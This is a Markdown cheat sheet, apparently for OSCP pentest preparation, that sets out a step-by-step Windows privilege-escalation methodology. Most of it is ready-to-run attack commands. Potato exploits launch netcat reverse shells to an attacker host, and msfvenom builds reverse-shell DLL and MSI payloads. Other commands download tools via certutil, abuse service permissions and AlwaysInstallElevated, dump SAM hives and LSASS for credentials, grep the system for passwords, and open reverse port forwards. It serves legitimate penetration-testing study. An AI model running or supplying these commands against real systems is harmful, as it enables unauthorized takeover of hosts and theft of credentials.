# Methodology 2 — Windows Privilege Escalation

> Goal: low-priv user/service → SYSTEM (or local admin). First rule: **`whoami /priv` and `whoami /groups`**. If you have `SeImpersonate` (you usually do from a web/DB/service shell) → Potato → done. Otherwise enumerate systematically, try quick wins first, avoid rabbit holes.

---

## 0. Situational awareness (run these first, always)
```cmd
whoami /priv                 :: <-- SeImpersonate? SeBackup? SeRestore? etc.
whoami /groups               :: Backup Operators, Remote Mgmt Users, custom groups
whoami /all
systeminfo                   :: OS, build, arch, hotfixes (kernel exploits)
hostname & ipconfig /all     :: DNS server often = DC IP
net user & net localgroup administrators
net users <me> /domain
```
```powershell
Get-LocalUser ; Get-LocalGroupMember Administrators
Get-Process ; netstat -ano          :: internal ports to forward, running apps
```

## 1. Automated enum (drop one, read it fully)
```powershell
.\winPEASany.exe quiet cmd fast searchfast filesinfo userinfo servicesinfo
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1   # colour output
. .\PowerUp.ps1 ; Invoke-AllChecks
.\SharpUp.exe audit
.\Seatbelt.exe -group=all
```
Note anything flagged red/yellow but **verify manually** before chasing it.

---

## 2. THE QUICK WINS — test in this order

### A. Token privileges (`whoami /priv`) — fastest path
| Privilege | Exploit |
|---|---|
| **SeImpersonate / SeAssignPrimaryToken** | **Potato → SYSTEM** (see below) |
| **SeBackup** | read SAM/SYSTEM hive → secretsdump |
| **SeRestore** | overwrite service binary / utilman.exe |
| **SeTakeOwnership** | `takeown` a SYSTEM file, replace it |
| SeDebug | dump LSASS (procdump → mimikatz) |
| SeLoadDriver | load vulnerable driver (BYOVD) |

**Potato (SeImpersonate) — the bread-and-butter OSCP service-account escalation.** A web/MSSQL/IIS shell almost always has it.
```cmd
:: GodPotato — best compatibility, Server 2012–2022 (match .NET version)
.\GodPotato-NET4.exe -cmd "C:\temp\nc.exe $LHOST 4444 -e cmd.exe"
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
:: PrintSpoofer — Win10 / Server 2016-2019
.\PrintSpoofer64.exe -i -c cmd          :: or  -c "nc.exe $LHOST 443 -e cmd"
:: If token is stripped (Local/Network Service) restore privs first:
.\FullPowers.exe -c "cmd /c whoami /priv" -z
:: Older/other: JuicyPotato (<= 1809, needs CLSID), RoguePotato (-r $LHOST), SweetPotato
```
Get a service-account shell to run these: `PsExec64.exe -accepteula -i -u "nt authority\local service" cmd` or via xp_cmdshell / webshell.

**SeBackup/SeRestore → dump hashes:**
```cmd
reg save hklm\sam sam ; reg save hklm\system system
:: or diskshadow/robocopy for locked SAM; then on kali:
impacket-secretsdump -sam sam -system system LOCAL
```

### B. Services (very common) — `winPEASany.exe quiet servicesinfo`
```cmd
sc.exe qc <svc>                 :: binpath, start, run-as
.\accesschk.exe /accepteula -uwcqv user <svc>
```
- **Insecure service permissions** (SERVICE_CHANGE_CONFIG / ALL_ACCESS) + you can stop/start:
  ```cmd
  sc config <svc> binpath= "\"C:\temp\rev.exe\""
  net stop <svc> & net start <svc>
  ```
  (If you can change config but **not** stop/start → usually dead end.)
- **Unquoted service path** with a writable dir in the path → drop `Program.exe` / `Common.exe` in the gap:
  ```cmd
  .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path\"
  ```
- **Weak registry perms** on the service key → `reg add …\<svc> /v ImagePath /d C:\temp\rev.exe /f` then start.
- **Insecure service binary** (you can overwrite the .exe) → replace it, restart.
- **DLL hijack** → missing DLL in a writable PATH dir; `msfvenom -p windows/x64/shell_reverse_tcp LHOST=.. LPORT=.. -f dll -o hijack.dll`.

### C. Registry / autoruns / installer
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
:: writable AutoRun exe → replace, wait for admin logon/reboot
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
**AlwaysInstallElevated** = 1 in **both** hives → SYSTEM:
```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=$LHOST lport=443 -f msi -o rev.msi
```
```cmd
msiexec /quiet /qn /i rev.msi
```

### D. Scheduled tasks
```cmd
schtasks /query /fo LIST /v | findstr /i "taskname next run status author"
```
```powershell
Get-ScheduledTask | ? {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,State
```
Writable script/binary a task runs as a higher user → append your payload:
```cmd
.\accesschk.exe /accepteula -quv user C:\path\task.ps1
echo C:\temp\rev.exe >> C:\path\task.ps1
```

### E. Startup apps
```cmd
.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```
Writable → drop a `.lnk` to your revshell (cscript CreateShortcut.vbs), fires on admin logon.

---

## 3. Hunt for passwords (do this early and often)
```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\winlogon"   :: autologon DefaultPassword
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
cmdkey /list                                   :: saved creds → runas /savecred
findstr /si password *.xml *.ini *.txt *.config *.ps1
dir /s /b *pass* *cred* *.kdbx *unattend* 2>nul
```
```powershell
Get-ChildItem -Recurse -Include *.config,*.xml,*.ps1 | Select-String -Pattern "password|pwd|connectionstring"
```
- **Unattend.xml / sysprep.inf** (often base64 pass), **web.config**, **wp-config.php**, app config strings.
- **Saved creds** → `runas /savecred /user:admin "C:\temp\rev.exe"`.
- **Autologon** found → use with RDP/WinRM/psexec.
- **Firefox/Chrome creds**, **KeePass .kdbx** (keepass2john → crack), **PuTTY/WinSCP** sessions.
- Reuse any found password with `winexe`/`pth-winexe`/evil-winrm/psexec as another user.

---

## 4. Installed apps & kernel (when misconfigs dry up)
```cmd
:: 32 & 64-bit installed software
```
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname,displayversion
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname,displayversion
```
- Vulnerable installed app (local, "has app" on exploitdb) → searchsploit. Non-standard process → `.\Seatbelt.exe NonstandardProcesses` / `winPEASany.exe quiet processinfo`, forward its internal port if needed.
- **Insecure GUI app running as admin (Citrix method):** if a GUI app runs elevated, break out to a shell via File→Open dialog path bar.
- **Kernel exploit = last resort** (can crash):
  ```bash
  python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only
  ```
  Match build/hotfixes → precompiled (SecWiki/windows-kernel-exploits) / Watson. Use the right arch.

---

## 5. Getting the SYSTEM/admin shell to land + stabilise
```cmd
:: move tools over
certutil -urlcache -f http://$LHOST/nc.exe nc.exe
powershell iwr -uri http://$LHOST/winPEASany.exe -o p.exe
:: from admin → system if needed
.\PsExec64.exe -accepteula -i -s cmd        :: -s = SYSTEM
```
Port forward an internal-only vuln service back to Kali:
```cmd
.\plink.exe -R 445:127.0.0.1:445 root@$LHOST     :: then winexe to 127.0.0.1
```

---

## Windows privesc decision flow
1. `whoami /priv` → **SeImpersonate? → Potato → SYSTEM.** Other tokens → their technique.
2. `whoami /groups` → Backup Operators / privileged / custom group → that path.
3. winPEAS + PowerUp → services (perms / unquoted / registry / binary / DLL) → quick to exploit, try first.
4. Password hunt (reg, configs, cmdkey, unattend, autologon, KeePass) → reuse everywhere.
5. AlwaysInstallElevated, scheduled tasks, autoruns, startup.
6. Installed app exploit / GUI breakout.
7. **Kernel exploit only when everything else fails.**
8. Stuck → re-read the full winPEAS dump and highlight anything unfamiliar (odd process, dir, username). Don't panic — it's always there.
